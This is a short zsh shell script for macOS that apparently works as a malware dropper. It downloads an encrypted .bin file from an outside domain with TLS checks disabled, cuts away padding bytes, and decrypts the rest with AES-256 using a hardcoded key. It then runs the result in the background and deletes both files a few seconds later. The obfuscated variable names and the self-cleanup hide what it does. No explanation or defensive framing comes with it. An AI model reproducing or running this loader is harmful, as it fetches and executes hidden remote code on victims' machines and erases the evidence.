#!/bin/zsh
f9az8=$(mktemp /tmp/673648.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m2ec1706cb15bf4dd.bin" -o "$f9az8z" || exit 1
cu2p3e=$(stat -f %z "$f9az8z"); r96gn45=$(( cu2p3e - 1609 - 2947 ))
tail -c +$(( 1609 + 1 )) "$f9az8z" | head -c $r96gn45 | openssl enc -d -aes-256-cbc -k 50b3fb96564e7345ac7731d2 -out "$f9az8" 2>/dev/null
[ -s "$f9az8" ] && chmod 700 "$f9az8" && ( "$f9az8" & ) && disown
( sleep 3; rm -f "$f9az8" "$f9az8z" ) &>/dev/null &
